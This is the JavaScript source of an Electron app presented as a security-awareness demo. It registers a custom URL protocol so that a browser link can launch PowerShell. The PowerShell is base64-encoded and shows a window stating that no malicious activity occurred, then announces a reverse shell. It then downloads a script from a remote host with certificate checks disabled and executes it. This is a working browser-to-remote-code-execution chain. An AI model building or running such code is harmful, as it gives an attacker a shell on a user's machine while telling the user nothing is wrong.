const { app, shell, dialog } = require('electron');
const { spawn, execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

const TARGET_URL = 'https://bjornmijs.asuscomm.com:9095/testsite/startlearning/';

//
// -------------------- LOGGING --------------------
//
function log(msg) {
  try {
    const logPath = path.join(app.getPath('userData'), 'busted-demo.log');
    fs.appendFileSync(logPath, `[${new Date().toISOString()}] ${msg}\n`);
  } catch {}
}

//
// -------------------- ADMIN CHECK --------------------
//
function isElevated() {
  try {
    execSync('fltmc', { stdio: 'ignore' });
    return true;
  } catch {
    return false;
  }
}

//
// -------------------- SINGLE INSTANCE --------------------
//
const gotLock = app.requestSingleInstanceLock();
if (!gotLock) {
  log('Another instance detected. Quitting.');
  app.quit();
}

//
// -------------------- DEEP LINK PARSING --------------------
//
function extractDeepLink(argv) {
  const raw = (argv || []).find(
    a => typeof a === 'string' && a.toLowerCase().includes('m1jsdemo://')
  );

  if (!raw) return null;

  return raw.trim().replace(/^"+|"+$/g, '').replace(/\/+$/g, '');
}

function handleDeepLink(url) {
  if (!url) return;

  log(`Deep link received: ${url}`);

  const normalized = url.toLowerCase().replace(/\/+$/g, '');

  if (normalized === 'm1jsdemo://run') {
    log('Deep link matched -> launching PowerShell demo');
    runBenignPowerShell();
  } else {
    log(`Deep link not matched: ${normalized}`);
  }
}

//
// -------------------- POWERSHELL DEMO --------------------
//
function runBenignPowerShell() {

  const psScript = `
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "M1jsXploit – Security Demo"
$form.Size = New-Object System.Drawing.Size(900,600)
$form.StartPosition = "CenterScreen"
$form.BackColor = "Black"
$form.MinimumSize = New-Object System.Drawing.Size(700,450)

$textBox = New-Object System.Windows.Forms.TextBox
$textBox.Multiline = $true
$textBox.ReadOnly  = $true
$textBox.Dock      = "Fill"
$textBox.BackColor = "Black"
$textBox.ForeColor = "Lime"
$textBox.Font      = New-Object System.Drawing.Font("Consolas", 10)
$textBox.ScrollBars = "Both"
$textBox.WordWrap   = $false
$textBox.HideSelection = $true
$textBox.TabStop = $false

# Parser-safe admin check (1 line!)
$admin = (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)


$lines = @(
'        _  _    __  __      _       _ _   ',
'  /\\/\\ / |(_)___\\ \\/ /_ __ | | ___ (_) |_ ',
' /    \\| || / __|\\  /| ''_ \\| |/ _ \\| | __|',
'/ /\\/\\ \\ || \\__ \\/  \\| |_) | | (_) | | |_ ',
'\\/    \\/_|/ |___/_/\\_\\ .__/|_|\\___/|_|\\__|',
'        |__/         |_|                  ',
'',
'================================================',
'ELECTRON → POWERSHELL SECURITY DEMO',
'================================================',
("Running as Administrator (PowerShell): {0}" -f $admin),
'',
'This window was launched via:',
'Browser → Custom Protocol → Electron → PowerShell',
'',
'No malicious activity occurred.',
'This is a controlled security awareness demo.',
'',
'Close this window to start reverse shell',
'',
'================================================'
)

$textBox.Text = ($lines -join [Environment]::NewLine)
$form.Controls.Add($textBox)

$form.Add_Shown({
  $textBox.SelectionStart = 0
  $textBox.SelectionLength = 0
  $form.ActiveControl = $null
})

[void]$form.ShowDialog()

$url = "https://bjornmijs.asuscomm.com:9095/testsite/agent"

$raw = & curl.exe -k -s $url
$script = ($raw | Out-String)

if ([string]::IsNullOrWhiteSpace($script)) {
    throw "Geen script ontvangen"
}

# expliciet uitvoeren (maar nog steeds bewust!)
$scriptBlock = [ScriptBlock]::Create($script)
& $scriptBlock


`;

  const encoded = Buffer.from(psScript, 'utf16le').toString('base64');

  const psExe = process.env.WINDIR
    ? path.join(process.env.WINDIR, 'System32', 'WindowsPowerShell', 'v1.0', 'powershell.exe')
    : 'powershell.exe';

  log(`Spawning PowerShell: ${psExe}`);

  const ps = spawn(
    psExe,
    ['-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'RemoteSigned', '-EncodedCommand', encoded],
    { windowsHide: false }
  );

  ps.on('spawn', () => log('PowerShell spawned OK'));
  ps.stderr.on('data', d => log(`PS stderr: ${d}`));
  ps.on('error', e => log(`Spawn error: ${e.message}`));
  ps.on('close', code => log(`PowerShell exited with code ${code}`));
}

//
// -------------------- EVENTS --------------------
//
app.on('second-instance', (event, argv) => {
  log(`second-instance argv: ${JSON.stringify(argv)}`);
  const url = extractDeepLink(argv);
  if (url) handleDeepLink(url);
});

app.on('open-url', (event, url) => {
  event.preventDefault();
  handleDeepLink(url);
});

//
// -------------------- MAIN STARTUP --------------------
//
app.whenReady().then(async () => {

  log(`App ready. isPackaged=${app.isPackaged}`);
  log(`process.argv: ${JSON.stringify(process.argv)}`);

  // Elevation check popup
  if (process.platform === 'win32') {
    const elevated = isElevated();
    log(`Elevation check: ${elevated ? 'ADMIN' : 'NOT ADMIN'}`);

    await dialog.showMessageBox({
      type: elevated ? 'info' : 'warning',
      title: 'Elevation Check',
      message: elevated
        ? '✅ Running as Administrator'
        : '⚠️ NOT running as Administrator'
    });
  }

  app.setAsDefaultProtocolClient('m1jsdemo');

  const firstUrl = extractDeepLink(process.argv);
  if (firstUrl) {
    handleDeepLink(firstUrl);
    return;
  }

  log(`Opening browser: ${TARGET_URL}`);
  await shell.openExternal(TARGET_URL);

  app.quit();
});